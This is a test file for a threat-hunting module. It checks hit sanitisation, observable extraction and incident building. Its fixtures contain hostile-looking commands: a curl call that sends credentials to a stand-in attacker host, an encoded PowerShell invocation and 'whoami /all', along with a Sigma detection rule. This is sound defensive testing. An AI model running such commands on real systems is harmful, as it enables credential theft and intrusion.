import { describe, expect, it } from 'vitest';
import { HUNT_DEFAULT_EXPECTED_OBSERVABLES, huntExpectedObservables, huntHitDates, mergeEvidence, sanitizeEvidence, sanitizeHits } from '../../../../src/modules/hunt/hunt-utils';
import { extractHitObservables } from '../../../../src/modules/hunt/hunt-hit-observations';
import { buildHuntIncidentContent, HUNT_INCIDENT_RECOMMENDATION, huntIncidentRelatedIds } from '../../../../src/modules/hunt/hunt-incident';
import type { BasicStoreEntityHunt } from '../../../../src/modules/hunt/hunt-types';
import type { BasicStoreEntityHuntRun, HuntHit } from '../../../../src/modules/hunt/huntRun/huntRun-types';

const hit = (fields: Partial<HuntHit>): HuntHit => ({ timestamp: null, ...fields });

describe('Hit sample of a hunt run', () => {
  it('should keep single hits readable, masking secrets but not the account, host or event id an analyst triages', () => {
    const [stored] = sanitizeHits([{
      timestamp: '2026-10-05T10:00:00+02:00',
      matched_field: 'target.process.command_line',
      matched_value: 'curl -u admin:hunter2 https://evil.example/x',
      host: 'ws-042',
      user: 'alice@corp.example',
      event_id: '1234567890123',
      extra_fields: [{ name: 'parent', value: 'explorer.exe' }, { name: '', value: 'dropped' }],
    }]);
    expect(stored.timestamp).toEqual('2026-10-05T08:00:00.000Z');
    expect(stored.matched_value).toEqual('curl -u admin:[masked] https://evil.example/x');
    expect(stored.user).toEqual('alice@corp.example');
    expect(stored.host).toEqual('ws-042');
    expect(stored.event_id).toEqual('1234567890123');
    expect(stored.extra_fields).toEqual([{ name: 'parent', value: 'explorer.exe' }]);
  });

  it('should cap the sample, truncate values and drop empty hits', () => {
    const hits = sanitizeHits([{ host: 'a' }, {}, { host: 'b' }, { host: 'c' }], 2, 8);
    expect(hits.map((item) => item.host)).toEqual(['a', 'b']);
    expect(sanitizeHits([{ command_line: 'powershell -enc AAAA' }], 5, 8)[0].command_line).toEqual('power...');
  });

  it('should date the first and last hit from the reported dates widened by the sample', () => {
    const hits = [hit({ timestamp: '2026-10-05T09:00:00.000Z' }), hit({ timestamp: '2026-10-05T07:00:00.000Z' })];
    expect(huntHitDates(hits)).toEqual({ first_hit_at: '2026-10-05T07:00:00.000Z', last_hit_at: '2026-10-05T09:00:00.000Z' });
    expect(huntHitDates(hits, { last_hit_at: '2026-10-05T11:00:00.000Z' }).last_hit_at).toEqual('2026-10-05T11:00:00.000Z');
    expect(huntHitDates([])).toEqual({ first_hit_at: null, last_hit_at: null });
  });

  it('should put the matched values before metadata constant across the hits', () => {
    const evidence = sanitizeEvidence([
      { field: 'metadata.baseLabels.logTypes', value_hash: 'winevtlog', count: 28 },
      { field: 'about', value_hash: 'x', count: 28 },
      { field: 'target.process.command_line', value_hash: 'cmd', value_preview: 'whoami /all', count: 3, matched: true },
    ], 2);
    expect(evidence[0]).toMatchObject({ field: 'target.process.command_line', matched: true });
    expect(mergeEvidence(evidence, [{ field: 'about', value_hash: evidence[1].value_hash, count: 1, matched: false }])[0].matched).toBe(true);
  });
});

describe('Observables of a hit', () => {
  it('should extract the addresses, domain, host, account, file and command line of a hit, never a masked value', () => {
    const observables = extractHitObservables(hit({
      source_ip: '10.0.0.4',
      destination_ip: '2001:db8::1',
      domain: 'Evil.Example',
      host: 'ws-042',
      user: 'alice',
      file_hash: 'D41D8CD98F00B204E9800998ECF8427E',
      command_line: 'curl -u admin:[masked] https://evil.example/x',
    }));
    expect(observables.map((observable) => observable.key)).toEqual([
      'IPv4-Addr:10.0.0.4',
      'IPv6-Addr:2001:db8::1',
      'Domain-Name:evil.example',
      'Hostname:ws-042',
      'User-Account:alice',
      'StixFile:d41d8cd98f00b204e9800998ecf8427e',
    ]);
    expect(observables[5].input).toEqual({ StixFile: { hashes: [{ algorithm: 'MD5', hash: 'd41d8cd98f00b204e9800998ecf8427e' }] } });
    expect(extractHitObservables(hit({ source_ip: 'not-an-ip', domain: '10.0.0.4', file_hash: 'xyz' }))).toEqual([]);
  });

  it('should send the default observable types when the hunt names none', () => {
    expect(huntExpectedObservables({ expected_observables: [] })).toEqual(HUNT_DEFAULT_EXPECTED_OBSERVABLES);
    expect(huntExpectedObservables({ expected_observables: ['Hostname'] })).toEqual(['Hostname']);
  });
});

describe('Incident of a hunt run', () => {
  const hunt = {
    internal_id: 'hunt-1',
    name: 'Encoded PowerShell',
    hypothesis: '',
    description: 'Attackers run encoded PowerShell on workstations',
    sigma_rule: 'title: Encoded PowerShell\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  sel:\n    CommandLine|contains: -enc\n  condition: sel\nlevel: high\n',
    'hunt-source': ['indicator-1'],
    'hunt-target': ['org-1'],
    'hunt-technique': ['technique-1'],
  } as unknown as BasicStoreEntityHunt;
  const run = {
    internal_id: 'run-1',
    hits_count: 28,
    distinct_entities: 3,
    time_window_start: '2026-10-04T00:00:00.000Z',
    time_window_end: '2026-10-05T00:00:00.000Z',
    first_hit_at: '2026-10-04T08:00:00.000Z',
    last_hit_at: '2026-10-04T18:00:00.000Z',
    security_platform_id: 'platform-1',
    hit_observation_ids: ['observed-data-1', 'hostname-1'],
    hit_sample: [
      hit({ timestamp: '2026-10-04T08:00:00.000Z', host: 'ws-042', user: 'alice', matched_field: 'target.process.command_line', matched_value: 'powershell -enc AAAA' }),
      hit({ timestamp: '2026-10-04T18:00:00.000Z', host: 'ws-042', user: 'bob', matched_field: 'target.process.command_line' }),
    ],
  } as unknown as BasicStoreEntityHuntRun;

  it('should describe the hypothesis, the rule and the hits, rated by the rule level and dated by the hits', () => {
    const content = buildHuntIncidentContent(hunt, run, null, 'Google SecOps');
    expect(content.severity).toEqual('high');
    expect(content.first_seen).toEqual('2026-10-04T08:00:00.000Z');
    expect(content.last_seen).toEqual('2026-10-04T18:00:00.000Z');
    expect(content.description).toContain('Hunt hypothesis: Attackers run encoded PowerShell on workstations');
    expect(content.description).toContain('Rule: Encoded PowerShell (level high)');
    expect(content.description).toContain('on Google SecOps between 2026-10-04T08:00:00.000Z and 2026-10-04T18:00:00.000Z');
    expect(content.description).toContain('Hosts: ws-042 (2)');
    expect(content.description).toContain('host ws-042, user alice, target.process.command_line = powershell -enc AAAA');
    expect(content.description).toContain(HUNT_INCIDENT_RECOMMENDATION);
    expect(content.description).not.toContain('Hunt hypothesis: \n');
  });

  it('should fall back on the window and a medium severity without hits dates nor rule level', () => {
    const bare = { ...hunt, sigma_rule: null, description: null } as unknown as BasicStoreEntityHunt;
    const content = buildHuntIncidentContent(bare, { ...run, first_hit_at: null, last_hit_at: null, hit_sample: [] }, null, null);
    expect(content.severity).toEqual('medium');
    expect(content.first_seen).toEqual(run.time_window_start);
    expect(content.description).not.toContain('Hunt hypothesis');
    expect(content.description).toContain('reported no single hit');
  });

  it('should relate the incident to the hunt, its sources, targets and techniques, the platform and the hit observations', () => {
    expect(huntIncidentRelatedIds(hunt, run)).toEqual(['hunt-1', 'indicator-1', 'org-1', 'technique-1', 'platform-1', 'observed-data-1', 'hostname-1']);
  });
});
